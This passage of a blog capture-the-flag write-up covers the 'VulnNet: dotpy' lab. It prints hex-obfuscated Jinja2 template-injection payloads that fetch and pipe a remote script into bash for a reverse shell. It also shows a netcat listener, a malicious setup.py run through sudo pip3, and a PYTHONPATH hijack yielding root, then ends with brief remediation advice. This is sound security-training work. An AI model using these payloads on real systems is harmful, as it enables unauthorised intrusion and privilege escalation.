</pre></td><td class="rouge-code"><pre><span class="p">{{</span><span class="n">request</span><span class="o">|</span><span class="n">attr</span><span class="p">(</span><span class="s">'application'</span><span class="p">)</span><span class="o">|</span><span class="n">attr</span><span class="p">(</span><span class="s">'</span><span class="se">\x5f\x5f</span><span class="s">globals</span><span class="se">\x5f\x5f</span><span class="s">'</span><span class="p">)</span><span class="o">|</span><span class="n">attr</span><span class="p">(</span><span class="s">'</span><span class="se">\x5f\x5f</span><span class="s">getitem</span><span class="se">\x5f\x5f</span><span class="s">'</span><span class="p">)(</span><span class="s">'</span><span class="se">\x5f\x5f</span><span class="s">builtins</span><span class="se">\x5f\x5f</span><span class="s">'</span><span class="p">)</span><span class="o">|</span><span class="n">attr</span><span class="p">(</span><span class="s">'</span><span class="se">\x5f\x5f</span><span class="s">getitem</span><span class="se">\x5f\x5f</span><span class="s">'</span><span class="p">)(</span><span class="s">'</span><span class="se">\x5f\x5f</span><span class="s">import</span><span class="se">\x5f\x5f</span><span class="s">'</span><span class="p">)(</span><span class="s">'os'</span><span class="p">)</span><span class="o">|</span><span class="n">attr</span><span class="p">(</span><span class="s">'popen'</span><span class="p">)(</span><span class="s">'wget%2010</span><span class="se">\x2e</span><span class="s">8</span><span class="se">\x2e</span><span class="s">208</span><span class="se">\x2e</span><span class="s">76'</span><span class="p">)</span><span class="o">|</span><span class="n">attr</span><span class="p">(</span><span class="s">'read'</span><span class="p">)()}}</span>
</pre></td></tr></tbody></table></code></div>    </div>
  </li>
  <li>Run <code class="language-plaintext highlighter-rouge">netcat</code> to catch reverse connection.
    <div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre>nc <span class="nt">-lnvp</span> 4242
</pre></td></tr></tbody></table></code></div>    </div>
  </li>
  <li>Run reverse shell <code class="language-plaintext highlighter-rouge">cat index.html|bash</code>. To use the pipe <code class="language-plaintext highlighter-rouge">|</code> we’ll have to convert to hex <code class="language-plaintext highlighter-rouge">\x7c</code>.
    <div class="language-python highlighter-rouge"><div class="code-header">
        <span data-label-text="Python"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre><span class="p">{{</span><span class="n">request</span><span class="o">|</span><span class="n">attr</span><span class="p">(</span><span class="s">'application'</span><span class="p">)</span><span class="o">|</span><span class="n">attr</span><span class="p">(</span><span class="s">'</span><span class="se">\x5f\x5f</span><span class="s">globals</span><span class="se">\x5f\x5f</span><span class="s">'</span><span class="p">)</span><span class="o">|</span><span class="n">attr</span><span class="p">(</span><span class="s">'</span><span class="se">\x5f\x5f</span><span class="s">getitem</span><span class="se">\x5f\x5f</span><span class="s">'</span><span class="p">)(</span><span class="s">'</span><span class="se">\x5f\x5f</span><span class="s">builtins</span><span class="se">\x5f\x5f</span><span class="s">'</span><span class="p">)</span><span class="o">|</span><span class="n">attr</span><span class="p">(</span><span class="s">'</span><span class="se">\x5f\x5f</span><span class="s">getitem</span><span class="se">\x5f\x5f</span><span class="s">'</span><span class="p">)(</span><span class="s">'</span><span class="se">\x5f\x5f</span><span class="s">import</span><span class="se">\x5f\x5f</span><span class="s">'</span><span class="p">)(</span><span class="s">'os'</span><span class="p">)</span><span class="o">|</span><span class="n">attr</span><span class="p">(</span><span class="s">'popen'</span><span class="p">)(</span><span class="s">'cat%20index</span><span class="se">\x2e</span><span class="s">html</span><span class="se">\x7c</span><span class="s">bash'</span><span class="p">)</span><span class="o">|</span><span class="n">attr</span><span class="p">(</span><span class="s">'read'</span><span class="p">)()}}</span>
</pre></td></tr></tbody></table></code></div>    </div>
  </li>
</ol>

<h2 id="05-foot-hold"><span class="mr-2">[05] Foot Hold</span><a href="#05-foot-hold" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2>

<p>Our <code class="language-plaintext highlighter-rouge">netcat</code> listeners prompt changes, and we’re able to run commands as the web user. Let’s check for the other users on the system and our <code class="language-plaintext highlighter-rouge">sudo</code> privileges.</p>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre></td><td class="rouge-code"><pre>web@vulnnet-dotpy:~<span class="nv">$ </span><span class="nb">cat</span> /etc/passwd | <span class="nb">grep </span>sh<span class="err">$</span>
root:x:0:0:root:/root:/bin/bash
system-adm:x:1000:1000:system-adm,,,:/home/system-adm:/bin/bash
web:x:1001:1001:,,,:/home/web:/bin/bash
manage:x:1002:1002:,,,:/home/manage:/bin/bash
</pre></td></tr></tbody></table></code></div></div>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre></td><td class="rouge-code"><pre>web@vulnnet-dotpy:~<span class="nv">$ </span><span class="nb">sudo</span> <span class="nt">-l</span>
Matching Defaults entries <span class="k">for </span>web on vulnnet-dotpy:
    env_reset, mail_badpass,
    <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin<span class="se">\:</span>/snap/bin

User web may run the following commands on vulnnet-dotpy:
    <span class="o">(</span>system-adm<span class="o">)</span> NOPASSWD: /usr/bin/pip3 <span class="nb">install</span> <span class="k">*</span>
</pre></td></tr></tbody></table></code></div></div>

<h2 id="06-privilege-escalation"><span class="mr-2">[06] Privilege Escalation</span><a href="#06-privilege-escalation" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2>

<p>Because we can run <code class="language-plaintext highlighter-rouge">pip3 install *</code> as <code class="language-plaintext highlighter-rouge">system-adm</code> we’re able to run any Python file on the system.  The code below will reuse the work we have already completed.
We’ll create a Python script called <code class="language-plaintext highlighter-rouge">setup.py</code>.  Using <code class="language-plaintext highlighter-rouge">popen</code> to run <code class="language-plaintext highlighter-rouge">wget</code> with <code class="language-plaintext highlighter-rouge">-O -</code> we are able to pipe <code class="language-plaintext highlighter-rouge">index.html</code> directly into <code class="language-plaintext highlighter-rouge">bash</code>.</p>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre></td><td class="rouge-code"><pre><span class="nb">echo</span> <span class="s1">'from os import popen
popen("wget 10.8.208.76 -O -|bash")'</span> <span class="o">&gt;</span> setup.py

<span class="nb">sudo</span> <span class="nt">-u</span> system-adm /usr/bin/pip3 <span class="nb">install</span> <span class="nt">-e</span> <span class="nb">.</span>
</pre></td></tr></tbody></table></code></div></div>

<h2 id="07-root"><span class="mr-2">[07] ROOT</span><a href="#07-root" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2>

<p>Now we can easily read the <code class="language-plaintext highlighter-rouge">user.txt</code></p>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre></td><td class="rouge-code"><pre>system-adm@vulnnet-dotpy:~<span class="nv">$ </span><span class="nb">cat</span> ~/user.txt
THM[REDACTED]
</pre></td></tr></tbody></table></code></div></div>
<p>Running <code class="language-plaintext highlighter-rouge">sudo -l</code> again we can run <code class="language-plaintext highlighter-rouge">/opt/backup.py</code> using Python and also <code class="language-plaintext highlighter-rouge">SETENV</code>.</p>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre></td><td class="rouge-code"><pre>system-adm@vulnnet-dotpy:~<span class="nv">$ </span><span class="nb">sudo</span> <span class="nt">-l</span>
<span class="nt">---snip---</span>
User system-adm may run the following commands on vulnnet-dotpy:
    <span class="o">(</span>ALL<span class="o">)</span> SETENV: NOPASSWD: /usr/bin/python3 /opt/backup.py
</pre></td></tr></tbody></table></code></div></div>

<p>We don’t have read or write permissions to <code class="language-plaintext highlighter-rouge">/opt</code>, <code class="language-plaintext highlighter-rouge">/opt/backup.py</code>, or <code class="language-plaintext highlighter-rouge">/home/manager</code> but taking a look at the <code class="language-plaintext highlighter-rouge">backup.py</code> we can see it is importing a few packages.  This means we should be able to import our own package instead of original ones.</p>

<div class="language-python highlighter-rouge"><div class="code-header">
        <span data-label-text="Python"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre></td><td class="rouge-code"><pre><span class="kn">from</span> <span class="nn">datetime</span> <span class="kn">import</span> <span class="n">datetime</span>
<span class="kn">from</span> <span class="nn">pathlib</span> <span class="kn">import</span> <span class="n">Path</span>
<span class="kn">import</span> <span class="nn">zipfile</span>
<span class="o">---</span><span class="n">snip</span><span class="o">---</span>
</pre></td></tr></tbody></table></code></div></div>

<p>The <code class="language-plaintext highlighter-rouge">SETENV</code> permission lets us set the <code class="language-plaintext highlighter-rouge">PYTHONPATH</code> which dictates where one of the directory that Python will use to search for packages.</p>

<h3 id="zipfilepy"><span class="mr-2">zipfile.py</span><a href="#zipfilepy" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3>

<p>Getting the backup script to run our own code is quite simple.</p>

<ol>
  <li>Create <code class="language-plaintext highlighter-rouge">zipfile.py</code> with the code we want to execute.
    <div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre><span class="nb">echo</span> <span class="s1">'import pty; pty.spawn("/bin/bash")'</span> <span class="o">&gt;</span> /tmp/zipfile.py
</pre></td></tr></tbody></table></code></div>    </div>
  </li>
  <li>Run command
    <div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre><span class="nb">sudo </span><span class="nv">PYTHONPATH</span><span class="o">=</span>/tmp/ /usr/bin/python3 /opt/backup.py
</pre></td></tr></tbody></table></code></div>    </div>
  </li>
  <li>Collect flag
    <div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre></td><td class="rouge-code"><pre>root@vulnnet-dotpy:/tmp# <span class="nb">cat</span> /root/root.txt 
THM[REDACTED]
</pre></td></tr></tbody></table></code></div>    </div>
  </li>
</ol>

<h2 id="08-remediation"><span class="mr-2">[08] Remediation</span><a href="#08-remediation" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2>

<p>In this section we will talk about a few ways to mitigate the risks and vulnerabilities that we found in the system.</p>

<h3 id="ssti"><span class="mr-2">SSTI</span><a href="#ssti" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3>
<p>There was a good attempt to black list several characters from our URL requests. A simple fix here would no to return any dynamic output on the <code class="language-plaintext highlighter-rouge">404</code> error page.</p>

<h3 id="backup-script"><span class="mr-2">Backup Script</span><a href="#backup-script" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3>
<p>Removing <code class="language-plaintext highlighter-rouge">SETENV</code> permission from <code class="language-plaintext highlighter-rouge">sudo</code> will mitigate this issue.  Another fix would be to use another backup program and away from <code class="language-plaintext highlighter-rouge">Python</code>.</p>

</div>

<div class="post-tail-wrapper text-muted">

  <!-- categories -->
  
  <div class="post-meta mb-3">
    <i class="far fa-folder-open fa-fw mr-1"></i>
    
      <a href='/categories/capturetheflag/'>capturetheflag</a>,
      <a href='/categories/tryhackme/'>tryhackme</a>
  </div>
  

  <!-- tags -->
  
  <div class="post-tags">
    <i class="fa fa-tags fa-fw mr-1"></i>
      
      <a href="/tags/python/"
          class="post-tag no-text-decoration" >python</a>
      
      <a href="/tags/jinja2/"
          class="post-tag no-text-decoration" >jinja2</a>
      
      <a href="/tags/hex/"
          class="post-tag no-text-decoration" >hex</a>
      
      <a href="/tags/ssti/"
          class="post-tag no-text-decoration" >ssti</a>
      
  </div>
  

  <div class="post-tail-bottom
    d-flex justify-content-between align-items-center mt-3 pt-5 pb-2">
    <div class="license-wrapper">

      

        

        This post is licensed under 
        <a href="https://creativecommons.org/licenses/by/4.0/">
          CC BY 4.0
        </a>
         by the author.

      
    </div>

    <!--
 Post sharing snippet
-->

<div class="share-wrapper">
  <span class="share-label text-muted mr-1">Share</span>
  <span class="share-icons">
    
    

    
      
        <a href="https://twitter.com/intent/tweet?text=VulnNet: dotpy - InfoSec Journey&amp;url=https://glenntoms.github.io/posts/vulnnet-dotpy/" data-toggle="tooltip" data-placement="top"
          title="Twitter" target="_blank" rel="noopener" aria-label="Twitter">
          <i class="fa-fw fab fa-twitter"></i>
        </a>
    
      
        <a href="https://www.facebook.com/sharer/sharer.php?title=VulnNet: dotpy - InfoSec Journey&amp;u=https://glenntoms.github.io/posts/vulnnet-dotpy/" data-toggle="tooltip" data-placement="top"
          title="Facebook" target="_blank" rel="noopener" aria-label="Facebook">
          <i class="fa-fw fab fa-facebook-square"></i>
        </a>
    
      
        <a href="https://t.me/share/url?url=https://glenntoms.github.io/posts/vulnnet-dotpy/&amp;text=VulnNet: dotpy - InfoSec Journey" data-toggle="tooltip" data-placement="top"
          title="Telegram" target="_blank" rel="noopener" aria-label="Telegram">
          <i class="fa-fw fab fa-telegram"></i>
        </a>
    

    <i id="copy-link" class="fa-fw fas fa-link small"
        data-toggle="tooltip" data-placement="top"
        title="Copy link"
        data-title-succeed="Link copied successfully!">
    </i>

  </span>
</div>


  </div><!-- .post-tail-bottom -->

</div><!-- div.post-tail-wrapper -->


      
    
    

    </div>
  </div> <!-- #core-wrapper -->

  <!-- pannel -->
  <div id="panel-wrapper" class="col-xl-3 pl-2 text-muted">

    <div class="access">
      















  <div id="access-lastmod" class="post">
    <div class="panel-heading">Recently Updated</div>
    <ul class="post-content pl-0 pb-1 ml-1 mt-2">
      
        
        
        
      <li><a href="/posts/vulnnet/">VulnNet</a></li>
      
    </ul>
  </div> <!-- #access-lastmod -->



      















  
    
    
    
    
      
        
        

  
    
    
    
    
      
    
  
    
    
    
    
      
        
        

  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
        
        

  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
        
        

  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
        
        

  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
        
        

  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
        
        

  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
        
        



  <div id="access-tags">
    <div class="panel-heading">Trending Tags</div>
    <div class="d-flex flex-wrap mt-3 mb-1 mr-3">

    
      
      <a class="post-tag" href="/tags/hashcat/">hashcat</a>
    
      
      <a class="post-tag" href="/tags/hex/">hex</a>
    
      
      <a class="post-tag" href="/tags/jinja2/">jinja2</a>
    
      
      <a class="post-tag" href="/tags/john/">john</a>
    
      
      <a class="post-tag" href="/tags/lfi/">lfi</a>
    
      
      <a class="post-tag" href="/tags/python/">python</a>
    
      
      <a class="post-tag" href="/tags/ssti/">ssti</a>
    
      
      <a class="post-tag" href="/tags/tar/">tar</a>
    

    </div>
  </div>


    </div>

    
      
      



<!-- BS-toc.js will be loaded at medium priority -->
<script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script>

<div id="toc-wrapper" class="pl-0 pr-4 mb-5">
  <div class="panel-heading pl-3 pt-2 mb-2">Contents</div>
  <nav id="toc" data-toggle="toc"></nav>
</div>


    
  </div>

</div>

<!-- tail -->

<div class="row">
  <div class="col-12 col-lg-11 col-xl-8">
    <div id="tail-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4">
      
        
        <!--
 Recommend the other 3 posts according to the tags and categories of the current post,
 if the number is not enough, use the other latest posts to supplement.
-->

<!-- The total size of related posts  -->


<!-- An random integer that bigger than 0  -->


<!-- Equals to TAG_SCORE / {max_categories_hierarchy}  -->








  

  
    
  

  

  

  

  

  








<!-- Fill with the other newlest posts  -->




  
    
    
  
    
    
      
      
    
  





  <div id="related-posts" class="mt-5 mb-2 mb-sm-4">
    <h3 class="pt-2 mt-1 mb-4 ml-1"
      data-toc-skip>Further Reading</h3>
    <div class="card-deck mb-4">
    
      
      
      <div class="card">
        <a href="/posts/vulnnet/">
          <div class="card-body">
            <!--
  Date format snippet
  See: ${JS_ROOT}/utils/timeago.js
-->

<em class="timeago small"
    data-ts="1646028431"
    
    >
  2022-02-28
</em>

            <h3 class="pt-0 mt-1 mb-3" data-toc-skip>VulnNet</h3>
            <div class="text-muted small">
              <p>
                





                [01] Outline



VulnNet has a Medium difficulty rating running PHP as its web language. The brief states that it takes a more realistic approach to infiltrating the system.

Our first step is to en...
              </p>
            </div>
          </div>
        </a>
      </div>
    
    </div> <!-- .card-deck -->
  </div> <!-- #related-posts -->


      
        
        <!--
  Navigation buttons at the bottom of the post.
-->

<div class="post-navigation d-flex justify-content-between">
  
  <a href="/posts/vulnnet/" class="btn btn-outline-primary"
    prompt="Older">
    <p>VulnNet</p>
  </a>
  

  
  <span class="btn btn-outline-primary disabled"
    prompt="Newer">
    <p>-</p>
  </span>
  

</div>

      
        
        <!--  The comments switcher -->


      
    </div>
  </div>
</div> <!-- .row -->



        <!--
  The Footer
-->

<footer class="d-flex w-100 justify-content-center">
  <div class="d-flex justify-content-between align-items-center text-muted">
    <div class="footer-left">
      <p class="mb-0">
        © 2022
        <a href="https://twitter.com/glenn__toms">Glenn Toms</a>.
        
        <span data-toggle="tooltip" data-placement="top"
          title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span>
        
      </p>
    </div>

    <div class="footer-right">
      <p class="mb-0">
        

        

        Powered by 
          <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a>
         with 
          <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a>
         theme.

      </p>
    </div>

  </div> <!-- div.d-flex -->
</footer>


      </div>

      <!--
  The Search results
-->
<div id="search-result-wrapper" class="d-flex justify-content-center unloaded">
  <div class="col-12 col-sm-11 post-content">
    <div id="search-hints">
      















  
    
    
    
    
      
        
        

  
    
    
    
    
      
    
  
    
    
    
    
      
        
        

  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
        
        

  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
        
        

  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
        
        

  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
        
        

  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
        
        

  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
        
        



  <div id="access-tags">
    <div class="panel-heading">Trending Tags</div>
    <div class="d-flex flex-wrap mt-3 mb-1 mr-3">

    
      
      <a class="post-tag" href="/tags/hashcat/">hashcat</a>
    
      
      <a class="post-tag" href="/tags/hex/">hex</a>
    
      
      <a class="post-tag" href="/tags/jinja2/">jinja2</a>
    
      
      <a class="post-tag" href="/tags/john/">john</a>
    
      
      <a class="post-tag" href="/tags/lfi/">lfi</a>
    
      
      <a class="post-tag" href="/tags/python/">python</a>
    
      
      <a class="post-tag" href="/tags/ssti/">ssti</a>
    
      
      <a class="post-tag" href="/tags/tar/">tar</a>
    

    </div>
  </div>


    </div>
    <div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div>
  </div>
</div>


    </div> <!-- #main-wrapper -->

    

    <div id="mask"></div>

    <a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button">
      <i class="fas fa-angle-up"></i>
    </a>

    <!--
  Jekyll Simple Search loader
  See: <https://github.com/christian-fei/Simple-Jekyll-Search>
-->





<script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js"></script>

<script>
SimpleJekyllSearch({
  searchInput: document.getElementById('search-input'),
  resultsContainer: document.getElementById('search-results'),
  json: '/assets/js/data/search.json',
  searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0">  <a href="{url}">{title}</a>  <div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1">    {categories}    {tags}  </div>  <p>{snippet}</p></div>',
  noResultsText: '<p class="mt-5">Oops! No result founds.</p>',
  templateMiddleware: function(prop, value, template) {
    if (prop === 'categories') {
      if (value === '') {
        return `${value}`;
      } else {
        return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`;
      }
    }

    if (prop === 'tags') {
      if (value === '') {
        return `${value}`;
      } else {
        return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`;
      }
    }
  }
});
</script>


    <!--
  JS selector for site.
-->

<!-- layout specified -->


  



  <!-- image lazy-loading & popup & clipboard -->
  

  







  
    

    

  



  
    

    

  



  
    

    

  




  <script src="https://cdn.jsdelivr.net/combine/npm/magnific-popup@1/dist/jquery.magnific-popup.min.js,npm/lozad/dist/lozad.min.js,npm/clipboard@2/dist/clipboard.min.js"></script>







  

  

  







  
    

    

  



  
    

    

  



  
    

    

  



  
    

    

  




  <script src="https://cdn.jsdelivr.net/combine/npm/dayjs@1/dayjs.min.js,npm/dayjs@1/locale/en.min.js,npm/dayjs@1/plugin/relativeTime.min.js,npm/dayjs@1/plugin/localizedFormat.min.js"></script>








<script defer src="/assets/js/dist/post.min.js"></script>



<!-- commons -->

<script src="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/js/bootstrap.bundle.min.js"></script>




  </body>

</html>

